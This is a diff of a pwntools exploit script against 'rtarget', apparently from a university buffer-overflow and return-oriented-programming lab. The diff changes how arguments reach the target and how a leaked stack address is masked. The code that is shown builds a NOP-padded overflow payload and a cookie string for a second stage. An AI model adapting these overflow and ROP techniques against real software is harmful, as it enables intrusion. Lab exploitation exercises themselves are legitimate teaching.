@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
 from pwn import *
+from sys import argv
 
 context.binary = "rtarget"
 context.terminal = ["zellij", "run", "--"]
 
-proc = process(["rtarget", "-q"])
+proc = process(["rtarget", *argv])
 elf = ELF("rtarget")
 rop = ROP("rtarget")
 cookie = int(open("cookie.txt").read(), 16)
@@ -19,7 +20,7 @@ exploit = b"\x90" * buffer_size \
 
 proc.sendline(exploit)
 proc.recvuntil("No exploit.  Getbuf returned ")
-rsp = int(proc.recvline(), 16) - 0x8 * 2 | 0x7fff00000000
+rsp = int(proc.recvline(), 16) - 0x8 * 2 | 0x7ffe00000000
 
 sval = hex(cookie)[2:].encode("utf-8") + b"\0"
 exploit = b"\x90" * buffer_size \
